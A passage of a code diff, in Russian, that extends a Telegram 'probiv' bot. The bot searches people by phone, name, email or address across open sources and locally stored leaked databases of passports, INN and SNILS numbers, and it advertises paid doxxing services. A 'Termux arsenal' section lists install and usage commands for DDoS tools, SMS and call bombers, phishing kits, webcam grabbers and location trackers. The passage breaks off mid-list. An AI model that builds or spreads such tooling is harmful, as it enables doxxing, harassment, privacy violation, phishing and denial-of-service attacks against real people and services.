+        additional.append("")
+        additional.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        additional.append("│                                      🔥 АКТУАЛЬНЫЕ ИНСТРУМЕНТЫ 2026                                      │")
+        additional.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        
+        # Sonar Search
+        additional.append("│  🎯 SONAR SEARCH: http://sonarsearch.xyz (100 руб/30 проверок)                                          │")
+        additional.append("│  🕵️ SHERLOCK REPORT: https://github.com/sherlock-tg-probiv (2 бесплатных запроса)                       │")
+        additional.append("│  👁️ ГЛАЗ БОГА: https://glazboga.online (зеркала: @invalid_sambot, @onlyEOG)                             │")
+        
+        # Telegram боты
+        if tools.get("telegram_bots"):
+            additional.append("│                                                                                                            │")
+            additional.append("│  🤖 TELEGRAM БОТЫ:                                                                                         │")
+            for bot in tools["telegram_bots"][:10]:
+                additional.append(f"│     • {bot['name']}: {bot['url']} │")
+        
+        # GitHub инструменты
+        if tools.get("github_tools"):
+            additional.append("│                                                                                                            │")
+            additional.append("│  🐙 GITHUB ИНСТРУМЕНТЫ:                                                                                    │")
+            for tool in tools["github_tools"][:8]:
+                additional.append(f"│     • {tool['name']}: {tool['url']} │")
+        
+        # Leak checkers
+        additional.append("│                                                                                                            │")
+        additional.append("│  💀 ПОИСК ПО УТЕЧКАМ:                                                                                      │")
+        for name, url in ActualOSINT2026.LEAK_CHECKERS.items():
+            additional.append(f"│     • {name}: {url} │")
+        
+        additional.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        
+        paste += "\n" + "\n".join(additional)
+    
+    return paste
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ОТДЕЛЬНАЯ КОМАНДА /sonar (для быстрого доступа)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['sonar'])
+def sonar_command(message):
+    """Sonar Search"""
+    text = """🔍 **SONAR SEARCH** — http://sonarsearch.xyz
+
+• ФИО, адреса, Авито/Юла
+• Привязанные Telegram-аккаунты
+• Родственники, пароли
+
+💰 100 руб / 30 проверок"""
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 20: ПОИСК ПО ТВОИМ БАЗАМ ДАННЫХ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+import os
+import re
+import pandas as pd
+from pathlib import Path
+
+class MyDatabases:
+    """Поиск по твоим базам данных"""
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 👇👇👇 СЮДА ВСТАВЛЯЙ ПУТИ К СВОИМ ФАЙЛАМ 👇👇👇
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    # Пример: "название_базы": "путь_к_файлу"
+    DB_PATHS = {
+        "Швейцария": "Switzerland.xls",   # ← ЭТОТ ФАЙЛ ТЫ УЖЕ СКИНУЛ
+        # "База_операторов": "operators.csv",
+        # "Паспорта": "passports.json",
+        # "ГИБДД": "gibdd.xlsx",
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # КОД ПОИСКА (НЕ ТРОГАЙ)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    _cache = {}
+    
+    @classmethod
+    def _normalize(cls, text: str) -> str:
+        """Очищает текст для поиска"""
+        if not text:
+            return ""
+        text = str(text).lower()
+        text = re.sub(r'[^a-zа-яё0-9\+]', '', text)
+        return text
+    
+    @classmethod
+    def _load_file(cls, file_path: str):
+        """Загружает файл"""
+        if file_path in cls._cache:
+            return cls._cache[file_path]
+        
+        if not os.path.exists(file_path):
+            return []
+        
+        ext = Path(file_path).suffix.lower()
+        data = []
+        
+        try:
+            if ext == '.csv':
+                df = pd.read_csv(file_path, encoding='utf-8')
+                data = df.to_dict('records')
+            elif ext in ['.xls', '.xlsx']:
+                df = pd.read_excel(file_path)
+                data = df.to_dict('records')
+            elif ext == '.json':
+                import json
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    data = json.load(f)
+                    if isinstance(data, dict):
+                        data = [data]
+            elif ext == '.txt':
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        if ';' in line:
+                            parts = line.strip().split(';')
+                            data.append(dict(zip(['col1','col2','col3','col4','col5'], parts)))
+                        elif ',' in line:
+                            parts = line.strip().split(',')
+                            data.append(dict(zip(['col1','col2','col3','col4','col5'], parts)))
+                        else:
+                            data.append({'text': line.strip()})
+        except Exception as e:
+            print(f"Ошибка загрузки {file_path}: {e}")
+        
+        cls._cache[file_path] = data
+        return data
+    
+    @classmethod
+    def search(cls, query: str) -> dict:
+        """Ищет во всех базах"""
+        results = {}
+        query_norm = cls._normalize(query)
+        
+        for db_name, db_path in cls.DB_PATHS.items():
+            data = cls._load_file(db_path)
+            matches = []
+            
+            for row in data:
+                found = False
+                match_info = {}
+                
+                for col, val in row.items():
+                    if val and query_norm in cls._normalize(str(val)):
+                        found = True
+                        match_info[col] = val
+                
+                if found:
+                    matches.append(match_info)
+            
+            if matches:
+                results[db_name] = {
+                    "count": len(matches),
+                    "matches": matches[:10]  # первые 10 совпадений
+                }
+        
+        return results
+    
+    @classmethod
+    def format_report(cls, query: str, results: dict) -> str:
+        """Форматирует отчёт"""
+        if not results:
+            return f"\n❌ В базах ничего не найдено по: {query}\n"
+        
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💾 ПОИСК ПО ТВОИМ БАЗАМ                                           │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔍 ЗАПРОС: {query:<68} │")
+        lines.append("│                                                                                                            │")
+        
+        for db_name, info in results.items():
+            lines.append(f"│  📁 БАЗА: {db_name:<66} │")
+            lines.append(f"│     📊 НАЙДЕНО: {info['count']:<64} │")
+            for match in info['matches'][:5]:
+                for col, val in list(match.items())[:3]:
+                    val_str = str(val)[:60]
+                    lines.append(f"│     • {col}: {val_str:<60} │")
+            lines.append("│     ───────────────────────────────────────────────────────────────────────────────────────────── │")
+        
+        lines.append("└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘")
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ОБНОВЛЯЕМ КОМАНДУ /global — ТЕПЕРЬ ИЩЕТ И В ТВОИХ БАЗАХ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# ЭТА ФУНКЦИЯ УЖЕ ЕСТЬ В ТВОЁМ БОТЕ, НО МЫ ЕЁ ДОПОЛНЯЕМ
+# Если у тебя уже есть @bot.message_handler(commands=['global']), 
+# просто добавь в неё эти строки
+
+# ВОТ КАК ДОЛЖНА ВЫГЛЯДЕТЬ ОБНОВЛЁННАЯ КОМАНДА /global:
+
+@bot.message_handler(commands=['global', 'osint'])
+def global_with_my_dbs(message):
+    """Мега-поиск + ТВОИ БАЗЫ"""
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🌍 /global [номер/почта/ник/ФИО]")
+        return
+    
+    target = parts[1]
+    msg = bot.reply_to(message, f"🔍 ИЩУ: {target}\n⏳ Проверяю открытые источники + ТВОИ БАЗЫ...")
+    
+    # 1. Поиск в открытых источниках (твой старый код)
+    result = MegaOSINT.search_all(target)
+    
+    # 2. Поиск в ТВОИХ БАЗАХ
+    my_results = MyDatabases.search(target)
+    result["data"]["my_databases"] = my_results
+    result["my_db_report"] = MyDatabases.format_report(target, my_results)
+    
+    # 3. Генерируем пасту
+    paste = generate_paste(result)
+    
+    # 4. Добавляем отчёт по твоим базам
+    if my_results:
+        paste += "\n" + result["my_db_report"]
+    
+    # 5. Отправляем
+    if len(paste) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(paste)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 ОТЧЁТ — {target}")
+            os.unlink(f.name)
+        bot.delete_message(message.chat.id, msg.message_id)
+    else:
+        bot.edit_message_text(paste, message.chat.id, msg.message_id)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ОТДЕЛЬНАЯ КОМАНДА /mydb — ПРОВЕРИТЬ ТОЛЬКО ТВОИ БАЗЫ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['mydb', 'моибазы'])
+def search_my_dbs(message):
+    """Поиск только в твоих базах"""
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "📁 /mydb [номер/фио/почта]")
+        return
+    
+    query = parts[1]
+    msg = bot.reply_to(message, f"🔍 ИЩУ В ТВОИХ БАЗАХ: {query}")
+    
+    results = MyDatabases.search(query)
+    report = MyDatabases.format_report(query, results)
+    
+    bot.edit_message_text(report, message.chat.id, msg.message_id)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 21: ПОИСК ПО ВСЕМ ТВОИМ БАЗАМ ДАННЫХ (AUTO-DETECT)
+# Автоматически находит все .xls/.xlsx/.csv/.db/.json файлы в папке
+# Ищет по номеру телефона, ФИО, email, адресу
+# ═══════════════════════════════════════════════════════════════════════════════
+
+import os
+import re
+import glob
+import pandas as pd
+from pathlib import Path
+
+class AllMyDatabases:
+    """Автоматический поиск по всем твоим базам"""
+    
+    # Папка с базами (если базы в другой папке — укажи путь)
+    # Пустая строка = текущая папка с ботом
+    DATABASE_FOLDER = ""
+    
+    # Какие колонки искать (ключ: тип, значение: возможные названия колонок)
+    SEARCH_FIELDS = {
+        "phone": ["phone", "phone1", "phone2", "телефон", "номер", "mobile", "contact", "Phone", "Phone1", "Phone2"],
+        "name": ["name", "fullname", "fio", "фио", "ф.и.о.", "Name", "FullName", "ФИО"],
+        "email": ["email", "e-mail", "mail", "Email", "E-mail"],
+        "address": ["address", "addr", "адрес", "address line1", "Address", "Address Line1"],
+        "passport": ["passport", "паспорт", "series", "номер паспорта"],
+        "inn": ["inn", "инн", "ИНН"],
+        "snils": ["snils", "снилс", "СНИЛС"],
+    }
+    
+    # Кэш загруженных данных
+    _cache = {}
+    
+    @classmethod
+    def _find_all_databases(cls):
+        """Находит все файлы баз данных в папке"""
+        folder = cls.DATABASE_FOLDER or "."
+        extensions = ['*.xls', '*.xlsx', '*.csv', '*.db', '*.json', '*.txt']
+        files = []
+        for ext in extensions:
+            files.extend(glob.glob(os.path.join(folder, ext), recursive=True))
+        return files
+    
+    @classmethod
+    def _normalize_phone(cls, phone):
+        """Очищает номер телефона для поиска"""
+        if not phone:
+            return ""
+        phone = str(phone)
+        # Оставляем только цифры и плюс
+        clean = re.sub(r'[^0-9+]', '', phone)
+        # Если номер начинается с 00, заменяем на +
+        if clean.startswith('00'):
+            clean = '+' + clean[2:]
+        # Если 10 цифр и нет плюса, добавляем +7
+        if len(clean) == 10 and clean.isdigit():
+            clean = '+7' + clean
+        # Если 11 цифр и начинается с 8, заменяем на +7
+        if len(clean) == 11 and clean.startswith('8'):
+            clean = '+7' + clean[1:]
+        return clean
+    
+    @classmethod
+    def _load_file(cls, file_path):
+        """Загружает файл в зависимости от расширения"""
+        if file_path in cls._cache:
+            return cls._cache[file_path]
+        
+        if not os.path.exists(file_path):
+            return []
+        
+        ext = Path(file_path).suffix.lower()
+        data = []
+        
+        try:
+            if ext in ['.xls', '.xlsx']:
+                # Пробуем разные методы чтения Excel
+                try:
+                    df = pd.read_excel(file_path, engine='openpyxl')
+                except:
+                    df = pd.read_excel(file_path, engine='xlrd')
+                # Заменяем NaN на пустые строки
+                df = df.fillna('')
+                data = df.to_dict('records')
+                
+            elif ext == '.csv':
+                try:
+                    df = pd.read_csv(file_path, encoding='utf-8')
+                except:
+                    df = pd.read_csv(file_path, encoding='cp1251')
+                df = df.fillna('')
+                data = df.to_dict('records')
+                
+            elif ext == '.json':
+                import json
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    data = json.load(f)
+                    if isinstance(data, dict):
+                        data = [data]
+                        
+            elif ext == '.db':
+                import sqlite3
+                conn = sqlite3.connect(file_path)
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+                cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
+                tables = cursor.fetchall()
+                if tables:
+                    cursor.execute(f"SELECT * FROM {tables[0]['name']}")
+                    data = [dict(row) for row in cursor.fetchall()]
+                conn.close()
+                
+            elif ext == '.txt':
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                    # Пробуем распарсить как CSV с разделителями
+                    lines = content.split('\n')
+                    if ';' in lines[0]:
+                        import csv
+                        reader = csv.DictReader(lines, delimiter=';')
+                        data = list(reader)
+                    elif ',' in lines[0]:
+                        import csv
+                        reader = csv.DictReader(lines, delimiter=',')
+                        data = list(reader)
+                    else:
+                        data = [{'content': line} for line in lines if line.strip()]
+                        
+        except Exception as e:
+            print(f"⚠️ Ошибка загрузки {file_path}: {e}")
+            data = []
+        
+        cls._cache[file_path] = data
+        return data
+    
+    @classmethod
+    def search(cls, query):
+        """Ищет во всех базах"""
+        query = str(query).strip()
+        query_lower = query.lower()
+        query_phone = cls._normalize_phone(query)
+        
+        results = {}
+        files = cls._find_all_databases()
+        
+        for file_path in files:
+            db_name = os.path.basename(file_path).replace('.xls', '').replace('.xlsx', '').replace('.csv', '')
+            data = cls._load_file(file_path)
+            matches = []
+            
+            for row in data:
+                found = False
+                match_info = {"_source": db_name}
+                match_reason = ""
+                
+                for col, val in row.items():
+                    if not val:
+                        continue
+                    val_str = str(val)
+                    val_lower = val_str.lower()
+                    
+                    # Проверка по номеру телефона
+                    if query_phone and len(query_phone) >= 10:
+                        val_phone = cls._normalize_phone(val_str)
+                        if val_phone == query_phone:
+                            found = True
+                            match_reason = f"телефон {query_phone}"
+                            match_info[col] = val_str
+                            break
+                    
+                    # Проверка по точному совпадению
+                    if query_lower in val_lower:
+                        # Проверяем, что это не слишком короткое совпадение
+                        if len(query) >= 3 or val_lower == query_lower:
+                            found = True
+                            if not match_reason:
+                                match_reason = f"содержит '{query}'"
+                            match_info[col] = val_str
+                
+                if found:
+                    matches.append(match_info)
+            
+            if matches:
+                results[db_name] = {
+                    "file": file_path,
+                    "count": len(matches),
+                    "matches": matches[:15]  # Первые 15 совпадений
+                }
+        
+        return results
+    
+    @classmethod
+    def format_report(cls, query, results):
+        """Форматирует отчёт"""
+        if not results:
+            return f"\n❌ Ничего не найдено в базах по запросу: {query}\n"
+        
+        lines = []
+        lines.append("┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐")
+        lines.append("│                                         💾 ПОИСК ПО ТВОИМ БАЗАМ                                           │")
+        lines.append("├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤")
+        lines.append(f"│  🔍 ЗАПРОС: {query[:68]:<68} │")
+        lines.append("│                                                                                                            │")
+        
+        for db_name, info in results.items():
+            lines.append(f"│  📁 БАЗА: {db_name[:64]:<64} │")
+            lines.append(f"│     📊 НАЙДЕНО: {info['count']:<64} │")
+            lines.append("│     ───────────────────────────────────────────────────────────────────────────────────────────── │")
+            
+            for i, match in enumerate(info["matches"][:5]):
+                lines.append(f"│     📌 РЕЗУЛЬТАТ #{i+1}:                                                              │")
+                for col, val in list(match.items()):
+                    if col == "_source":
+                        continue
+                    val_str = str(val)[:60]
+                    lines.append(f"│        • {col}: {val_str:<60} │")
+                lines.append("│                                                                                                            │")
+            
+            lines.append("│                                                                                                            │")
+        
+        total = sum(info["count"] for info in results.values())
+        lines.append("╠════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣")
+        lines.append(f"│  ✅ ВСЕГО НАЙДЕНО: {total:<60} │")
+        lines.append("╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝")
+        
+        return "\n".join(lines)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ОБНОВЛЯЕМ /global ДЛЯ ПОИСКА ПО БАЗАМ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# Эта функция заменяет старую команду /global
+# Если у тебя уже есть @bot.message_handler(commands=['global']), 
+# просто замени её на эту
+
+@bot.message_handler(commands=['global', 'osint'])
+def global_with_all_dbs(message):
+    """Мега-поиск + все твои базы"""
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🌍 /global [номер/фио/почта/адрес]\n\nПримеры:\n/global +79001234567\n/global Иванов Иван\n/global user@mail.ru")
+        return
+    
+    target = parts[1]
+    msg = bot.reply_to(message, f"🔍 ПОИСК: {target}\n⏳ Проверяю открытые источники + ТВОИ БАЗЫ...")
+    
+    # 1. Поиск в твоих базах
+    my_results = AllMyDatabases.search(target)
+    my_report = AllMyDatabases.format_report(target, my_results)
+    
+    # 2. Поиск в открытых источниках (твой старый код)
+    try:
+        result = MegaOSINT.search_all(target)
+        open_report = generate_paste(result)
+    except:
+        open_report = "\n⚠️ Ошибка при поиске в открытых источниках\n"
+    
+    # 3. Объединяем отчёты
+    final_report = open_report + "\n" + my_report
+    
+    # 4. Отправляем
+    if len(final_report) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(final_report)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 ПОЛНЫЙ ОТЧЁТ — {target}")
+            os.unlink(f.name)
+        bot.delete_message(message.chat.id, msg.message_id)
+    else:
+        bot.edit_message_text(final_report, message.chat.id, msg.message_id)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ОТДЕЛЬНАЯ КОМАНДА /searchdb — ТОЛЬКО ТВОИ БАЗЫ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['searchdb', 'найтивбазах'])
+def search_only_dbs(message):
+    """Поиск только в твоих базах"""
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "📁 /searchdb [номер/фио/почта/адрес]\n\nПример:\n/searchdb +79001234567")
+        return
+    
+    query = parts[1]
+    msg = bot.reply_to(message, f"🔍 ИЩУ В ТВОИХ БАЗАХ: {query}")
+    
+    results = AllMyDatabases.search(query)
+    report = AllMyDatabases.format_report(query, results)
+    
+    bot.edit_message_text(report, message.chat.id, msg.message_id)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# КОМАНДА /dblist — ПОКАЗАТЬ ВСЕ НАЙДЕННЫЕ БАЗЫ
+# ═══════════════════════════════════════════════════════════════════════════════
+
+@bot.message_handler(commands=['dblist', 'списокбаз'])
+def list_dbs(message):
+    """Показывает все найденные базы данных"""
+    files = AllMyDatabases._find_all_databases()
+    
+    if not files:
+        bot.reply_to(message, "📁 Базы данных не найдены!\n\nУбедись, что файлы (.xls, .csv, .db) лежат в папке с ботом.")
+        return
+    
+    text = "📁 **НАЙДЕННЫЕ БАЗЫ ДАННЫХ:**\n\n"
+    for f in files:
+        name = os.path.basename(f)
+        size = os.path.getsize(f) / 1024  # KB
+        text += f"• `{name}` — {size:.1f} KB\n"
+    
+    text += f"\n📊 Всего баз: {len(files)}\n"
+    text += "\n💡 Команды для поиска:\n"
+    text += "• `/global [запрос]` — поиск везде\n"
+    text += "• `/searchdb [запрос]` — только ваши базы"
+    
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# ПРОВЕРКА ПРИ ЗАПУСКЕ — СКОЛЬКО БАЗ НАЙДЕНО
+# ═══════════════════════════════════════════════════════════════════════════════
+
+# Добавь эти строки в конец файла (перед bot.infinity_polling)
+# Они покажут при запуске, сколько баз найдено
+
+files_found = AllMyDatabases._find_all_databases()
+if files_found:
+    print("═" * 70)
+    print(f"📁 НАЙДЕНО БАЗ ДАННЫХ: {len(files_found)}")
+    for f in files_found:
+        print(f"   • {os.path.basename(f)}")
+    print("═" * 70)
+else:
+    print("⚠️ БАЗЫ ДАННЫХ НЕ НАЙДЕНЫ!")
+    print("   Убедись, что файлы .xls .xlsx .csv лежат в папке с ботом")
+    print("═" * 70)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК 22: ПОЛНЫЙ АРСЕНАЛ TERMUX ИНСТРУМЕНТОВ
+# OSINT | DDoS | Бомберы | Фишинг | Взлом | Деанон
+# Источник: @termux_hacker
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class TermuxTools:
+    """Все инструменты для Termux в одном месте"""
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 1. OSINT ИНСТРУМЕНТЫ (СБОР ИНФОРМАЦИИ)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    OSINT_TOOLS = {
+        "Infoga": {
+            "url": "https://github.com/m4ll0k/Infoga.git",
+            "description": "Сбор информации по email, номеру телефона",
+            "install": "git clone https://github.com/m4ll0k/Infoga.git\ncd Infoga\npip install -r requirements.txt",
+            "usage": "python infoga.py -n +79001234567 -o result.txt"
+        },
+        "PhoneInfoga": {
+            "url": "https://github.com/sundowndev/phoneinfoga",
+            "description": "Продвинутый поиск по номеру телефона",
+            "install": "git clone https://github.com/sundowndev/phoneinfoga\ncd phoneinfoga\ngo build\n./phoneinfoga scan -n +79001234567",
+            "usage": "./phoneinfoga scan -n +79001234567"
+        },
+        "Sherlock": {
+            "url": "https://github.com/sherlock-project/sherlock",
+            "description": "Поиск по никнейму на 300+ сайтах",
+            "install": "git clone https://github.com/sherlock-project/sherlock\ncd sherlock\npip install -r requirements.txt",
+            "usage": "python sherlock никнейм"
+        },
+        "UserRecon": {
+            "url": "https://github.com/issamelferkh/userrecon.git",
+            "description": "Поиск по никнейму в 75+ соцсетях",
+            "install": "git clone https://github.com/issamelferkh/userrecon.git\ncd userrecon\nchmod +x userrecon.sh",
+            "usage": "bash userrecon.sh"
+        },
+        "Snoop": {
+            "url": "https://github.com/snooppr/snoop.git",
+            "description": "Мощный OSINT инструмент для поиска данных",
+            "install": "git clone https://github.com/snooppr/snoop.git\ncd snoop\npip install -r requirements.txt",
+            "usage": "python3 snoop.py никнейм"
+        },
+        "007-TheBond": {
+            "url": "https://github.com/Deadshot0x7/007-TheBond",
+            "description": "OSINT скрипт: Instagram, номер телефона, IP, соцсети",
+            "install": "git clone https://github.com/Deadshot0x7/007-TheBond\ncd 007-TheBond\npython -m venv venv\nsource venv/bin/activate\npip install -r requirements.txt",
+            "usage": "python 007-TheBond.py"
+        },
+        "Nexfil": {
+            "url": "https://github.com/thewhiteh4t/nexfil.git",
+            "description": "Поиск профилей по username на 350+ сайтах",
+            "install": "git clone https://github.com/thewhiteh4t/nexfil.git\ncd nexfil\npip install -r requirements.txt",
+            "usage": "python nexfil.py -u никнейм"
+        },
+        "osi.ig": {
+            "url": "https://github.com/th3unkn0n/osi.ig.git",
+            "description": "Сбор информации об Instagram аккаунте",
+            "install": "git clone https://github.com/th3unkn0n/osi.ig.git\ncd osi.ig",
+            "usage": "python main.py -u username\npython main.py -u username -p  # анализ публикаций"
+        },
+        "h8mail": {
+            "url": "pip install h8mail",
+            "description": "Поиск утечек по email",
+            "install": "pip3 install h8mail",
+            "usage": "h8mail -t target@example.com"
+        },
+        "devanok": {
+            "url": "https://github.com/tenych69/devanok",
+            "description": "OSINT разведка: авто, телефон, IP, торренты, Авито",
+            "install": "git clone https://github.com/tenych69/devanok\ncd devanok",
+            "usage": "python devanok.py"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 2. IP И ГЕОЛОКАЦИЯ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    IP_TOOLS = {
+        "IP-Tracer": {
+            "url": "https://github.com/rajkumardusad/IP-Tracer.git",
+            "description": "Отслеживание IP адреса",
+            "install": "git clone https://github.com/rajkumardusad/IP-Tracer.git\ncd IP-Tracer\nchmod +x install\n./install",
+            "usage": "trace -t IP-адрес"
+        },
+        "IPGeoLocation": {
+            "url": "https://github.com/maldevel/IPGeoLocation",
+            "description": "Геолокация по IP",
+            "install": "git clone https://github.com/maldevel/IPGeoLocation\ncd IPGeoLocation\npip install -r requirements.txt",
+            "usage": "python ipgeolocation.py -t IP-адрес"
+        },
+        "ipdrone": {
+            "url": "https://github.com/noob-hackers/ipdrone",
+            "description": "Сбор информации по IP",
+            "install": "git clone https://github.com/noob-hackers/ipdrone\ncd ipdrone",
+            "usage": "python ipdrone.py -v IP-адрес"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 3. DDoS ИНСТРУМЕНТЫ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    DDOS_TOOLS = {
+        "Hunner": {
+            "url": "https://github.com/b3-v3r/hunner",
+            "description": "DDoS атака с использованием дыр безопасности",
+            "install": "git clone https://github.com/b3-v3r/hunner\ncd hunner\napt install root-repo\napt install hping3",
+            "usage": "python hunner.py"
+        },
+        "DDos-Attack-OVH": {
+            "url": "https://github.com/HardyTomas/DDos-Attack-OVH-",
+            "description": "DDoS атака на порты 80 и 443",
+            "install": "git clone https://github.com/HardyTomas/DDos-Attack-OVH-\ncd DDos-Attack-OVH-\npip install toripchanger\npip install -r requirements.txt",
+            "usage": "python 80port.py\npython 443port.py"
+        },
+        "MODoS": {
+            "url": "https://github.com/Pix-head/MODoS",
+            "description": "DDoS на протоколы HTTP/TCP/UDP",
+            "install": "git clone https://github.com/Pix-head/MODoS\ncd MODoS\npip install -r requirements.txt",
+            "usage": "python modos.py HOST PORT PACKETS TIMEOUT\nПример: python modos.py http://google.com 80 150 2"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 4. БОМБЕРЫ (SMS/CALL)
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    BOMBER_TOOLS = {
+        "Impulse": {
+            "url": "https://github.com/LimerBoy/Impulse",
+            "description": "Мощный SMS бомбер",
+            "install": "git clone https://github.com/LimerBoy/Impulse\ncd Impulse\npip3 install -r requirements.txt",
+            "usage": "python3 impulse.py --method SMS --time 20 --threads 15 --target +79255554566"
+        },
+        "smsbaher": {
+            "url": "https://github.com/Antaskin/smsbaher.git",
+            "description": "SMS спамер для Termux",
+            "install": "git clone https://github.com/Antaskin/smsbaher.git\ncd smsbaher\npip install -r requirements.txt",
+            "usage": "python smsbaher.py"
+        },
+        "bomberthon": {
+            "url": "https://github.com/b31ngD3v/bomberthon",
+            "description": "Многофункциональный SMS бомбер",
+            "install": "git clone https://github.com/b31ngD3v/bomberthon\ncd bomberthon\npip3 install -r requirements.txt\nchmod +x geckodriver",
+            "usage": "python3 bomberthon.py"
+        },
+        "TBomb": {
+            "url": "https://github.com/TheSpeedX/TBomb.git",
+            "description": "SMS/Call бомбер с многопоточностью",
+            "install": "git clone https://github.com/TheSpeedX/TBomb.git\ncd TBomb",
+            "usage": "./TBomb.sh"
+        },
+        "Fludilka": {
+            "url": "https://github.com/pentestxr/Fludilka",
+            "description": "CALL спамер",
+            "install": "git clone https://github.com/pentestxr/Fludilka\ncd Fludilka/termux\npip3 install requests transliterate pyarmor",
+            "usage": "python fludilka.py"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 5. ФИШИНГ ИНСТРУМЕНТЫ
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    PHISHING_TOOLS = {
+        "grabcam": {
+            "url": "https://github.com/noob-hackers/grabcam",
+            "description": "Взлом веб-камер",
+            "install": "git clone https://github.com/noob-hackers/grabcam\ncd grabcam\nchmod +x grabcam.sh",
+            "usage": "bash grabcam.sh"
+        },
+        "AIOPhish": {
+            "url": "https://github.com/DeepSociety/AIOPhish",
+            "description": "100+ фишинг страниц",
+            "install": "git clone https://github.com/DeepSociety/AIOPhish\ncd AIOPhish\nbash install-termux.sh",
+            "usage": "bash aiophish.sh"
+        },
+        "shellphish": {
+            "url": "https://github.com/richardsonjf/shellphish",
+            "description": "Фишинг для Instagram, Facebook, Google, Steam и др.",
+            "install": "git clone https://github.com/richardsonjf/shellphish\ncd shellphish",
+            "usage": "bash shellphish.sh"
+        },
+        "HiddenEye": {
+            "url": "https://github.com/DarkSecDevelopers/HiddenEye.git",
+            "description": "Современный фишинг с кейлогером и живой атакой",
+            "install": "git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye.git\ncd HiddenEye\npip install -r requirements.txt",
+            "usage": "python HiddenEye.py"
+        },
+        "blackeye": {
+            "url": "https://github.com/An0nUD4Y/blackeye",
+            "description": "37 фишинг страниц + кастомные",
+            "install": "git clone https://github.com/An0nUD4Y/blackeye\ncd blackeye",
+            "usage": "bash blackeye.sh"
+        },
+        "QRgen": {
+            "url": "https://github.com/h0nus/QRgen",
+            "description": "Взлом через QR код с эксплойтами",
+            "install": "git clone https://github.com/h0nus/QRgen\ncd QRgen\npip install -r requirements.txt",
+            "usage": "python qrgen.py -l НОМЕР\n0: SQL 1: XSS 2: Команды 3: Формат 4: XXE 5: Fuzzing 6: SSI 7: LFI"
+        },
+        "Trape": {
+            "url": "https://github.com/jofpin/trape.git",
+            "description": "OSINT + фишинг, отслеживание через ссылку",
+            "install": "git clone https://github.com/jofpin/trape.git\ncd trape\npip3 install -r requirements.txt",
+            "usage": "python3 trape.py --url http://example.com --port 8080"
+        }
+    }
+    
+    # ═══════════════════════════════════════════════════════════════════════════
+    # 6. ДЕАНОНИМИЗАЦИЯ И СЛЕЖКА
+    # ═══════════════════════════════════════════════════════════════════════════
+    
+    TRACKING_TOOLS = {
+        "Seeker": {
+            "url": "https://github.com/thewhiteh4t/seeker.git",
+            "description": "Определение местоположения через ссылку",
+            "install": "git clone https://github.com/thewhiteh4t/seeker.git\ncd seeker\nchmod 777 install.sh\n./install.sh",
+            "usage": "python seeker.py"
+        },
+        "MapEye": {
+            "url": "https://github.com/bhikandeshmukh/MapEye.git",
